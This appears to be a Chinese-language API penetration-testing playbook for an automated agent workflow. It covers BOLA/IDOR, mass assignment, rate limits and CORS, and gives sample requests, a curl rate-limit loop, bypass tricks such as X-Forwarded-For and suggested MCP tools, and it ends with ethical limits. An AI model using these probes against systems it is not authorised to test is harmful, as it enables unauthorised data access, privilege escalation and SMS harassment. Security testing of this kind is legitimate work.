# REST / GraphQL / WebSocket API 安全 — 决策索引

> 视角:API 层授权 / 数据契约 / 速率限制 / 协议层缺陷。**Phase 4 测对应子类型时,先读本文件,再 Read 子文件**。

---

## 子文件路由(Phase 4 读哪一份?)

| 入口信号 | MUST Read |
|---|---|
| 见到 `/api/v1/.../{id}` REST endpoint / 数值 ID / GUID / `PATCH`/`PUT` body / `X-RateLimit-*` 头 | `10-rest-api.md` |
| 重复参数名 / HPP / 参数取值差异（WAF vs 后端不一致） | `10-rest-api.md` §C |
| CORS 头 / Origin 反射 / 跨域凭据读取 | `10-rest-api.md` §D |
| API 安全测试优先级 / Swagger 发现后的测试顺序 | `10-rest-api.md` §E |
| 端点是 `/graphql` / `/api/graphql` / 接受 `query`/`mutation`/`__schema` | `11-graphql.md` |
| 端点是 `wss://` / `ws://` / Sec-WebSocket-Protocol | `13-websocket.md` |
| 看到 `Authorization: Bearer eyJ...` (JWT) | 优先去 `../oauth-saml-jwt/12-jwt.md`,本目录 `12-jwt-api.md` 是 API 上下文的补充 |

> 注:`11-graphql.md` 与 `../graphql.md`、`12-jwt-api.md` 与 `../oauth-saml-jwt/12-jwt.md` 有内容重叠——本目录从 API 视角组织,跨参考时按需选一处。

---


> 视角：黑盒，针对 REST/JSON API 的常见缺陷

## 1. 一句话说清

REST API 漏洞 = 把"端点 + JSON 字段"当攻击面。
最常见 4 类：BOLA（IDOR 升级版）、Mass Assignment、速率 / 配额缺失、CORS 配置错。
渗透价值：BOLA / Mass Assignment 在大型目标中常见 P1 级别。

---

## 2. 高频入口点

```
/api/v1/...    /api/v2/...
/api/users/{id}    /api/orders/{id}    /api/messages/{id}
/api/users/{id}/orders     # 嵌套
/api/internal/...           # 不该公开的
/api/admin/...
/api/upload    /api/export    /api/import
```

API 文档：
- `/swagger-ui.html`、`/v2/api-docs`、`/openapi.json`、`/api-docs`
- 移动 APP 抓包（HTTPS 中间人 / objection / Frida）
- 微信小程序 wxapkg 解包后看 request 调用

---

## 3. 探测手法

### 3.1 BOLA / IDOR（OWASP API #1）

```
GET /api/orders/100   Authorization: A → 200 A 的订单
GET /api/orders/200   Authorization: A → 200 B 的订单（漏洞）

# 各种 ID 形态
数字递增：100 → 101 → ...
UUID：可能不可枚举，但仍可能被参数污染（如响应里含 link）
字段 in body：{"order_id":100} 改成 {"order_id":200}
嵌套关系：/users/{你}/orders → /users/{他}/orders
批量参数：?ids=1,2,3,4,5,...,1000
```

### 3.2 Mass Assignment（OWASP API #3）

加额外字段试服务端是否接受：

```json
// 注册接口
POST /api/users
{"username":"hunter","email":"a@b.c","password":"...",
 "is_admin":true,        // 试这个
 "role":"admin",          // 或这个
 "verified":true,
 "balance":1000000,
 "tier":"premium"}

// 更新接口
PATCH /api/users/me
{"is_admin":true}
PATCH /api/orders/123
{"status":"shipped","price":0.01}
```

发现：JSON 自动绑定模型字段时，未做字段白名单。

### 3.3 资源消耗 / 速率（OWASP API #4）

```
1. 登录端点：100 次/分钟无限制 → 撞库
2. 短信验证码：无频率 / 无图形验证 → 短信轰炸
3. 列表端点：?per_page=10000 → 性能 DoS
4. 文件上传：无大小限制 → 磁盘耗尽
5. 复杂查询：?filter=深度嵌套 → 查询超时

测试方法：
for i in {1..50}; do curl -I https://target/api/login; done | grep "HTTP"
# 50 个连续不被拒 = 速率缺失
```

### 3.4 功能权限（OWASP API #5）

```
# 普通用户调用 admin 端点
DELETE /api/admin/users/1   Authorization: 普通用户 token
→ 200 = 垂直越权

# 隐藏管理参数
GET /api/users/me?admin_view=true
GET /api/orders/100?include_audit_log=1

# Method 越权
GET 拦 → 试 POST/PUT/PATCH/OPTIONS

# 协议升级
HTTP → HTTPS-only 绕过：试 HTTP 是否仍可访问敏感端点
```

### 3.5 CORS 配置错

```bash
# 1. 检查 CORS 头
curl -H "Origin: https://attacker.com" -I https://target/api/me

# 危险组合
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true     ← 危险（虽然 spec 不允许 * + credentials）

Access-Control-Allow-Origin: https://attacker.com    ← 任意 Origin 接受
Access-Control-Allow-Credentials: true

# 2. null Origin（沙盒 iframe / data: / file:）
curl -H "Origin: null" https://target/api/me

# 3. 子域 / 前缀匹配
Origin: https://attacker.target.com    ← 如果接受 *.target.com
Origin: https://target.com.attacker.com
```

### 3.6 错误处理 / 信息泄露

```
?id=null     ?id=[]    ?id={"$gt":0}   ?id=NaN

→ 看响应是否含堆栈、SQL 错误、内部路径
```

### 3.7 GraphQL 见 `playbooks/graphql.md`

---

## 4. Bypass 矩阵

| 拦 | 绕 |
|---|---|
| Authorization 必填 | 试 Cookie 鉴权 / 试公开端点变体 |
| 后端只信 Authorization 不验内容 | 修改 JWT payload（见 `oauth-saml-jwt/00-index.md`） |
| API 文档不公开 | swagger / openapi / 抓 mobile / 解包小程序 |
| `is_admin` 字段拦 | 试 `isAdmin` / `admin` / `role:1` / `level:99` |
| 速率限制 | 多 IP / X-Forwarded-For 注入 / 多 token |
| CORS 严格 | 找 trusted 子域的 XSS / 开放重定向，再投毒 |

---

## 5. 利用提权 / 横向

```
BOLA → 拿大批用户数据
Mass Assignment（注册时设 is_admin） → admin 权限 → 后台
速率缺失（短信） → 短信轰炸 → 业务费用 / 用户骚扰
CORS + cookie 鉴权 → 跨域偷数据
```

---

## 6. 真实案例指纹

通用指纹：
- API 响应含字段 `is_admin`、`role`、`verified`、`balance` → 试反向 set
- 注册请求 body 包含 `role: "user"` → 改成 `role: "admin"` 试
- 列表端点 `per_page` 无上限 → DoS
- `Access-Control-Allow-Origin` reflect 任何 Origin → CORS 漏洞

---

## 7. 复现 / 证据要点

### 7.1 BOLA

```http
# 基线（账号 A 看自己）
GET /api/v1/orders/A_OWN_ID    Authorization: Bearer A_TOKEN
→ 200, A 数据

# 漏洞（账号 A 看 B）
GET /api/v1/orders/B_OWN_ID    Authorization: Bearer A_TOKEN
→ 200, B 数据（脱敏样本）
```

### 7.2 Mass Assignment

```http
POST /api/v1/users
Content-Type: application/json
Body: {"username":"hunter","password":"x","email":"a@b.c","is_admin":true}

→ 201 Created, response 含 "is_admin":true

# 立即用新账号验证
GET /api/v1/admin/dashboard   Authorization: Bearer NEW_TOKEN
→ 200 admin 内容
```

### 7.3 CVSS

```
BOLA → 大量 PII             = 6.5–8.1
Mass Assignment → admin    = 8.8–9.8
速率缺失 → 撞库             = 7.5
速率缺失 → 短信轰炸          = 5.3–7.5
CORS + credentials          = 7.5–8.1
```

### 7.4 影响段

```
GET /api/v1/orders/{id} 接口未校验资源所有权，账号 A 可读取账号 B 的订单。
我已用研究员控制的两个测试账号验证了 IDOR；并用 1 个随机 ID 证明可遍历，
样本仅取 1 条且全部脱敏。
```

---

## 相关 MCP 工具

实战中可调用 jshookmcp 完成自动化。**默认 `search` profile 未预加载工具,调用前先用 `mcp__jshook__activate_tools <工具名>` 激活**(详见 [`../../tools/mcp-jshook.md`](../../tools/mcp-jshook.md) §推荐 profile)。

| 工具 | 域 | 调用时机 |
|---|---|---|
| `mcp__jshook__graphql_introspect` | graphql | 资产展开 / 找隐藏 mutation 与未声明字段 |
| `mcp__jshook__graphql_extract_queries` + `mcp__jshook__graphql_replay` | graphql | 从抓包提取业务查询并重放(改变量) |
| `mcp__jshook__api_probe_batch` | workflow | 批量探测 BOLA / 权限差异(单 fetch burst) |
| `mcp__jshook__ws_monitor` + `mcp__jshook__ws_get_connections` | streaming | WebSocket 帧捕获 / 实时业务接口 |
| `mcp__jshook__protobuf_decode_raw` | encoding | 无 schema 时盲解 protobuf 请求 / 响应 |

完整映射:[`../../tools/mcp-jshook.md`](../../tools/mcp-jshook.md)

## 8. 不要做的事

- **禁**：通过 Mass Assignment 创建 admin 后实际使用管理员权限。仅证明 token 有 admin。
- **禁**：BOLA 批量遍历超过 10 条样本。
- **禁**：用速率漏洞实际发短信 100 条到他人手机。最多发到自己手机 10 条。
- **禁**：用 CORS 漏洞做真实跨域 PoC（让朋友访问 attacker.com）。自己浏览器自演。



---

完整 Payload 库见同级子文件。
